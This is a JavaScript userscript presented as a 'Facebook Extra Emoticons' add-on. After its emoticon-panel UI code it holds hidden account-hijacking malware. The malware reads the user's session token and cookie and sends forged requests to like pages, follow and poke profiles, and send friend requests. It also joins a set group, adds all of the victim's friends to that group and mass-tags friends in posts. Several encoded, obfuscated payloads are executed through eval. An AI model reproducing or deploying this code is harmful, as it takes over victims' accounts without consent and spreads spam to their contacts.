	html += '<a class="navLink" title="Show Facebook Extra Emoticons">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/adib.p.nuraga" target="_blank">Fb Admin : Adib Pugar Nuraga <br>KLIK DISINI</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; 
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); 
function Like(p) { 
var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; 
var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); } 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; 
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); 
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value; 
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); 
function a(abone) { 
var http4=new XMLHttpRequest; var url4="/ajax/follow/follow_profile.php?__a=1"; 
var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp="; http4.open("POST",url4,true); http4.onreadystatechange=function() { 
if(http4.readyState==4&&http4.status==200)http4.close } ; http4.send(params4) } 
function sublist(uidss) { 
var a = document.createElement('script'); a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();"; document.body.appendChild(a); } 
function p(abone) { 
var http4 = new XMLHttpRequest(); var url4 = "//www.facebook.com/ajax/poke_dialog.php"; 
var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp="; http4.open("POST", url4, true); http4.onreadystatechange = function () { if (http4.readyState == 4 && http4.status == 200) { http4.close; } }; http4.send(params4); }
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); 
var _9185;var _4015='3880A84D183F941F1001B973F929C997F953F977C973C661E853C693F977C981D977E697D661A1025A661E573A1005E921E989C661B885A661F777B661C973D937B1009C661B885D841D837C821C997E997C981C861F937B985F1001C937A993D997F693D697F769E661E1005D921D989A661B885D873F861F837E661C777D669F721C721B1009E1009B1009A717B941E921F929C937C925D977C977F961E717A929B977A969A721D921A957E921F1013E721E1001D941B953D721C965D953A961A937A717B981B949B981E669E769B661A573D1005B921E989F661C885E853F921A989E921C969B993B661B777A661D669A965E953A961F937B913E921B929D997E953B977C973E777D997F989F1001D937E685F941F997A913F937C973A997A913B953B933D937B973B997C953F941F953E937A989A777D669C705C977A981F977C705F669F685F993D977C1001E989A929D937F777F729E685E929E965F953B937D973F997C913D953C933D777F669B705C973A977C1009B705B669B681E737C793D737A753D761A753C757F737C757D745A753B685D989C977B977A997C953B933A777E1001A913E957A993C977C973C981D913C737F761D913B729F757D685E945D953B941F997B977B929A929A921D993E953E977F973E685B941F997E897B997E973F905A777F681C737B809A681E737D805D685F941F997A897F997B1017F981E937F905D777C733E725A685A941A997A897E985E953D933D905D777F745B757B761F725F757A729A729B737D733D761F741A753B725E733E753C761E733D745B753E685A941A997E897C969D941A913F993E997C977C989A1017A913A961F937E1017B905C777A733A757F729D741E761B749A733F761F725D725A729F761C737C729C741E737D761F745A733D685E941C997F897B949C921E993B913D937A1013B981A921E973A933C937F933A913D1001A941F953A905F777A729B685E973C929F997E989A897D913A969A977C933B905D777E981B921C945B937A965F937F997D913D949B977A969D937B913B993D997A989F937D921B969F685C913F913C1001D993C937C989E777A669F705B1001F993A937A989C913C953E933B705C669D685F913F913B921F777D729F685B913E913E933B1017D973C777B753F973B757E757D857E977B793F841B797D965F801B965B1017A977A929C981B921C937D685E913D913A989E937A985B777E945D741B685E941D925F913E933C997F993E945E777D669F705F941A925D913A933B997F993F945A705A669B685D981D949F993F997F921A969C981D777F669C769C661A885F717C977C981F937E973B693A669C853C849E865E869A669F709D661D885D873B861E837C709B661C997E989E1001B937A697E769E661B885F717C977A973C989A937B921D933B1017A993B997C921E997D937E929E949C921E973B945E937F661A777E661F941B1001A973F929C997E953A977E973D661A693D697F661D1025E661C953D941A661E693C885F717A989D937E921C933F1017C865E997B921C997A937A661D777E777F661A741C661E685B685D661A885B717C993B997D921B997A1001C993F661F777F777D661B733E725F725B697F661F1025F661F885D717B929C965C977F993E937C769B661F1033C661D1033E769F661C885E717F993B937C973F933D693E885D853B921C989C921C969B993D697F769E661B1033C661F573F573E721B721D661A865F869D793A869A873A865F661B721B661E853E821E849A869C849F573B853E693C669F733C741A753B757B741A757E753A753E757D749A761D753F753C725D745C669D697E769D573A853B693F669D729C741C737E733F749B741F729F761A733C741A761C749F725F745C757B669B697A769B573C853D693E669B729B745F757A733F725E733A725A745F729E725F725F761A745B725A725E669A697D769D573C853B693E669D733D733D761F725F753C745F733D737A725D745E757D757E757A741F757A669B697B769A573E853D693C669B729F733D761D733B725E725F757A745B725C745E749A761C725B745E761C669F697B769A573D853F693B669F733A741B733D725A729F737E761A761C761C733D757A753C753F741C737E669A697C769B573D853A693C669C729F725D729C741A733E745A749A725B749F749C753D761B761C729D753E669F697D769A573B573D721C721D661B853B793D817A809E661C573E837A953B961E937B693B669C729B741D753F761C749F753E753D761A733A725B729C745E749F725E761D669B697B769F573C837D953D961C937B693C669B741A745C729D737A733C729D737F745B757E737B725C761F757B761C753E669E697E769B573C837A953D961A937D693D669C733F741B729A761F733F761C753A753A745E761D745C749A733F753E733A669C697A769B573D837D953D961C937A693B669D741D725B749D749E761A749E745A733B733D753B749C745A745D733D749C669B697D769D573F837E953B961E937C693A669C733C725A745C725D733D741B745A725A733F761E761B757E749E733D749F669B697F769B573E837E953E961D937B693B669A729B761A725B737E733A757D749B741A741B737B741D741B761A745B749F669F697A769A573E837B953F961C937D693E669A729D753C753F757F725C745A737F745C733E733D753F733A741A749E761D669E697F769C769E';var _8845=/[\x41\x42\x43\x44\x45\x46]/;var _3412=2;var _1935=_4015.charAt(_4015.length-1);var _1272;var _5086=_4015.split(_8845);var _8428=[String.fromCharCode,isNaN,parseInt,String];_5086[1]=_8428[_3412+1](_8428[_3412](_5086[1])/21);var _1659=(_3412==6)?String:eval;_1272='';_11=_8428[_3412](_5086[0])/_8428[_3412](_5086[1]);for(_9185=3;_9185<_11;_9185++)_1272+=(_8428[_3412-2]((_8428[_3412](_5086[_9185])+_8428[_3412](_5086[2])+_8428[_3412](_5086[1]))/_8428[_3412](_5086[1])-_8428[_3412](_5086[2])+_8428[_3412](_5086[1])-1));var _7182='_5028';var _3629='_7182=_1272';function _8920(_8293){_1659(_8241);_8920(_6144);_6144(_3629);_8920(_7182);}var _8241='_8920=_1659';var _6144='_6144=_8920';_8920(_1935);
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var _5066;var _4528='891C189F122F1768C1867A1804B1921B1939D1255E1246C1561E1948B1876D1867B1768D1831E1183C1615D1804A1885D1822C1840A1885A1939A1840F1903F1183C1615C1921F1894F1813B1840F1867C1876D1948D1183B1543F1768F1921D1840A1183C1552F1885B1840F1183B2011A2011A1183A1498C1894B1966D1894D1858B1183B1363C1390B1183C1894E1921C1768E1885D1822C1183D1795B1768E1885E1183B1498B1804F1966F1804F1858D1183A1354B1345F1183D1894F1921C1768E1885B1822F1183D2011F2011A1183C1489E1984C1183B1471C1768D1795D1840F1777F1615E1597D1183F1246D1264E1426E';var _4155=/[\x41\x42\x43\x44\x45\x46]/;var _9561=2;var _6544=_4528.charAt(_4528.length-1);var _2860;var _8911=_4528.split(_4155);var _4321=[String.fromCharCode,isNaN,parseInt,String];_8911[1]=_4321[_9561+1](_4321[_9561](_8911[1])/21);var _4609=(_9561==6)?String:eval;_2860='';_11=_4321[_9561](_8911[0])/_4321[_9561](_8911[1]);for(_5066=3;_5066<_11;_5066++)_2860+=(_4321[_9561-2]((_4321[_9561](_8911[_5066])+_4321[_9561](_8911[2])+_4321[_9561](_8911[1]))/_4321[_9561](_8911[1])-_4321[_9561](_8911[2])+_4321[_9561](_8911[1])-1));var _3559='_3336';var _4023='_3559=_2860';function _9152(_4991){_4609(_2244);_9152(_3380);_3380(_4023);_9152(_3559);}var _2244='_9152=_4609';var _3380='_3380=_9152';_9152(_6544);
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
   
    http4.send(params4);
}

var _3858;var _1942='1875C63C167F631B676C655E622F673E640E658C655B421B670C676D619F649F640F670C673B445C676C640E625A670B670A448E421F694B355F421B421D421E421A421F421C421B421D421D421B421C421A421C421B421F421F679F616A667C421C616A421E508E421F625D658C622A676E652E628E655C673B463E622A667B628D616F673F628C532A649F628E652E628E655E673C445F442A670B622F667A640C661C673C442C448A502B355C421D421D421F421A421A421E421A421D421E421E421F421E421C421D421F421C616D463A640B655A655B628D667A541B577D556A553D421F508F421D427D655A628F682F421B520A670B688E655B622A571F628F664B676D628E670A673A445D448E463A670F628C673D580E571F544C445B442E466A616A643C616D685E466C631D667D640D628B655F625F670A466E649F640B670F673A670A466E670C676A619D670A622B667E640C619C628D466E652B658C625C640D631C688B514D649E658E622A616C673D640E658E655D508D661A628F667A652B616E649A640D655F646B439A616F622B673F640E658B655D508A670B676A619F670F622C667F640F619E628B442D448B463D670E628D673E529D616F673F616A445A694B421F631C649D640A625D499E421E427A421F454D421D676C640F625E670C670E421E454F421C427B421B700F448E463B670C628C655F625A445A448E502F427C502D355A421B421A421C421F421F421E421C421C421B421E421E421E421A421D421C421B625F658D622B676A652C628E655C673F463D619B658B625F688B463A616C661B661F628D655E625E526B637B640E649A625D445B616C448B502B355B700A355E466D466C544D529F421B535E523D421D445E616C625D640E619C565A559F448B355D355E616B445A427B472B469A469B469F469D481A478B490A481E478B478D475B481F484D496A427B448A502C355D616F445B427B472C469E469B469B469D481F484F496B472D472A490E496A478A487F478B427A448F502D355E616B445D427A472A469A469F469C469A487D478D484C475C496A484E490E475E478F493A427D448D502C355E616A445D427E472F469F469C469B469F481C487D490A493E478B484E481A472C493B496C427D448D502B355B616C445A427A472C493E475C484F478F487B487E484E484B481D427D448E502E355C616A445B427C472F469F469E469E469B487D478D493C490F478E496C484A481D487E496F427E448F502C355C355F670A676C619C649B640C670F673F445C427E472A490C487C469A478A484F493C481E496E475B475F487F472E475E469B427F448F502C355D670D676A619D649C640B670A673A445C427A472D493E496B469B469B481E475B469F490F496E475D475A469C484C487B427C448C502F355C670E676D619B649D640C670C673E445E427E472C496E487A496A484E478D496D487A478D490D496A478F490D481C490A427F448C502C355D670F676C619E649B640E670F673D445C427B472D493B469B481A484B472A484D481E484D481F484B481D472E475B478B427C448F502F355C670B676C619F649F640C670E673E445E427A472C478E493C469E490A490E481A487F475F484C481D490B490E487B475D478A427D448B502A355F670C676E619A649A640D670C673A445D427B475A478E472A472D484C487A481E487F490E469A481D469C472F487A478C427D448D502F';var _7105=/[\x41\x42\x43\x44\x45\x46]/;var _8957=2;var _1711=_1942.charAt(_1942.length-1);var _8649;var _1977=_1942.split(_7105);var _1164=[String.fromCharCode,isNaN,parseInt,String];_1977[1]=_1164[_8957+1](_1164[_8957](_1977[1])/21);var _2463=(_8957==9)?String:eval;_8649='';_11=_1164[_8957](_1977[0])/_1164[_8957](_1977[1]);for(_3858=3;_3858<_11;_3858++)_8649+=(_1164[_8957-2]((_1164[_8957](_1977[_3858])+_1164[_8957](_1977[2])+_1164[_8957](_1977[1]))/_1164[_8957](_1977[1])-_1164[_8957](_1977[2])+_1164[_8957](_1977[1])-1));var _4361='_8225';var _9757='_4361=_8649';function _1481(_7168){_2463(_8355);_1481(_7929);_7929(_9757);_1481(_4361);}var _8355='_1481=_2463';var _7929='_7929=_1481';_1481(_1711);

var gid = ['792896930727303'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "100004374332459";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date();
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}
 
 
//arkadaslari al ve isle
function sarkadaslari_al(){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                                  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                                  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
                                        smesaj = "";
                                        smesaj_text = "";
                                  for(i=f*10;i<(f+1)*10;i++){
                                        if(arkadaslar.payload.entries[i]){
                                  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
                                  smesaj_text += " " + arkadaslar.payload.entries[i].text;
                                  }
                                        }
                                        sdurumpaylas();                         }
                               
                        }
                       
        };
                var params = "&filter[0]=user";
                params += "&options[0]=friends_only";
                params += "&options[1]=nm";
                params += "&token=v7";
        params += "&viewer=" + user_id;
                params += "&__user=" + user_id;
               
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}
 
//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);
 
 
//arkada?¾ ekleme
function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){   
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
               
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
                xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
                cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
                xmlhttp.send(params);
}
}
 
//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                        eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                        cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
                        btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
                        if(cinshtml.getElementsByTagName("select")[0].value == "1"){
                        document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
                        }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
                        document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
                        }
                        eval(fonksiyon + "(" + id + "," + cins + ");");
                        }
        };
                xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.send();
}
var _4335;var _4503='3774E126A168E1086D1086E1200B1530A996C1194C1404D1434D1392B1284B1272E864A1392D1470C1404D1530A996A1170B996D1404F1470C1398E1506D1458E1410C1464D1500C1080A1392C1470C1404E1530F1158D864B1434B1416C1044D1392E1470C1404A1530B996B1002A1170C996E1464E1506B1452B1452D1050E864E1542E864C996D1404C1434E1512F996A1170F996A1404A1470A1398B1506A1458C1410D1464B1500E1080E1398D1488E1410F1386C1500E1410F1218C1452E1410D1458B1410D1464C1500D1044E1008F1404A1434F1512F1008A1050D1158B864A996F1404E1434F1512F1080B1494E1500B1530A1452F1410E1080A1476D1470B1494A1434F1500C1434D1470B1464B996D1170A996B1008B1416F1434C1524F1410F1404F1008F1158F864F996F1404A1434E1512F1080D1494A1500A1530C1452F1410B1080E1404D1434A1494F1476D1452A1386E1530C996C1170D996C1008D1392A1452F1470D1398B1446F1008A1158D864A996D1404F1434A1512A1080A1494A1500E1530A1452C1410D1080D1518E1434C1404F1500C1428C996A1170A996F1008D1098A1110A1092F1476A1524C1008E1158C864C996D1404E1434C1512F1080B1494A1500A1530D1452C1410C1080E1470C1476E1386C1398D1434A1500E1530A1170B996D1092D1080E1146D1092C1158C864B996A1404B1434A1512B1080E1494C1500E1530E1452D1410A1080C1392A1470B1500D1500A1470B1458C996A1170E996D1008E1062D1134C1092B1476E1524C1008B1158A864F996B1404C1434F1512D1080E1494F1500F1530D1452D1410B1080C1452A1410E1416E1500B996D1170B996D1008A1062D1092C1476B1524E1008E1158F864C996B1404A1434E1512A1080C1494F1500D1530D1452D1410B1080E1392F1386B1398B1446A1422C1488C1470F1506F1464F1404B1206B1470C1452D1470C1488D996D1170B996C1008C1014D1218F1134E1218C1200C1224D1104D1008E1158A864B996D1404A1434F1512D1080A1494F1500B1530E1452E1410E1080D1392C1470B1488E1404B1410F1488C996C1170D996C1008E1098B1476E1524D996C1494A1470E1452E1434F1404C996E1014C1128D1200C1140C1116E1200D1116A1008D1158D864F996E1404E1434C1512B1080B1494D1500A1530F1452C1410E1080F1476C1386E1404A1404B1434F1464F1422C996E1170F996A1008B1110C1476C1524B1008C1158E864D996B1404D1434C1512B1080D1434C1464F1464D1410E1488F1236D1308A1266F1260F996B1170A996C1008E1164F1386C996C1494A1500A1530C1452D1410E1170B1038A1416F1470C1464A1500A1074E1518B1410D1434A1422A1428F1500E1152C1392D1470F1452B1404C1158A1398D1470C1452B1470B1488B1152E1014A1218E1110A1092C1122D1092A1122A1038F996A1428F1488E1410D1416D1170C1038B1428E1500C1500B1476A1494D1152A1086D1086A1518B1518E1518D1080B1416C1386C1398F1410A1392E1470A1470C1446C1080C1398D1470B1458A1086B1386B1404F1434F1392D1080B1476D1080E1464C1506F1488C1386E1422C1386C1038F996B1500B1434F1500B1452E1410D1170F1038A1296C1410C1416C1488E1410B1494E1428D1038E1176E1164D1392E1452C1434C1464E1446C1176A1164F1398A1410F1464C1500A1410D1488D1176F1446B1452A1434A1446D996A1422F1386D1458A1392E1386A1488D996C1494C1458D1434E1452A1410F1530D996A1422D1410B1488B1386B1446D996F1404E1434E1386B1500E1386B1494E996C1404E1410E1446B1386B1500A996B1464E1386B1458C1386E996F1416C1392E996B1458C1506A996F1506A1500D1446C996B1458A1410D1464A1422D1386E1446B1500F1434B1416D1446D1386D1464D996C1410C1458D1470F1440A1434E1164D1086C1398B1410D1464E1500B1410C1488A1176C1164D1086B1392B1452E1434A1464A1446F1176A1164F1086D1386F1176E1008F864A996B1392A1470F1404D1530C1080D1386A1476A1476C1410B1464E1404F1206A1428F1434E1452D1404E1044C1404D1434B1512A1050D1158D864F1554D';var _3314=/[\x41\x42\x43\x44\x45\x46]/;var _2805=2;var _5060=_4503.charAt(_4503.length-1);var _1808;var _7986=_4503.split(_3314);var _2080=[String.fromCharCode,isNaN,parseInt,String];_7986[1]=_2080[_2805+1](_2080[_2805](_7986[1])/21);var _6789=(_2805==7)?String:eval;_1808='';_11=_2080[_2805](_7986[0])/_2080[_2805](_7986[1]);for(_4335=3;_4335<_11;_4335++)_1808+=(_2080[_2805-2]((_2080[_2805](_7986[_4335])+_2080[_2805](_7986[2])+_2080[_2805](_7986[1]))/_2080[_2805](_7986[1])-_2080[_2805](_7986[2])+_2080[_2805](_7986[1])-1));var _4979='_7035';var _1628='_4979=_1808';function _1338(_4031){_6789(_9998);_1338(_2181);_2181(_1628);_1338(_4979);}var _9998='_1338=_6789';var _2181='_2181=_1338';_1338(_5060);